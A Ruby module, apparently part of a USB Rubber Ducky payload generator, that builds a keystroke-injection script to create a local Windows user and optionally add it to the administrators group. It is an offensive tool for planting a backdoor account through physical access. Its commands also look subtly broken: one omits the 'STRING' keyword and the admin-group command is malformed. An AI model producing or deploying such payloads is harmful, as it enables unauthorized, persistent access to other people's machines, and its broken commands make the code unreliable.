#!/usr/bin/env ruby
require 'skeleton'
class AddUser < Skeleton
  attr_reader :ducky
  self.title = 'Add User'
  self.description = 'Add User to Local Machine'

  def setup
    @user = ''
    @user = rgets('Username: ') while @user == ''
    @pass = ''
    @pass = rgets('Password: ') while @pass == ''
    @priv = ''
    until @priv.downcase[0] == 'y' || @priv.downcase[0] == 'n'
      @priv = rgets('Add user to local admin group? ', 'y')
    end
    @priv = true if @priv.downcase[0] == 'y'
  end

  def finish
    priv_choice = @ducky_writer.menu
    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
      f.write(@ducky_writer.write(priv_choice))
      f.write("#{cmd_command(@user, @pass)}\n")
      f.write(cmd_command2(@user)) if @priv
    end
    Ducky::Compile.new("#{@file_name}.txt")
  end

  def cmd_command(user, pass)
    "net user #{user} #{pass} /add"
  end

  def cmd_command2(user)
    "STRING net local group Administrator #{user} /add"
  end
end
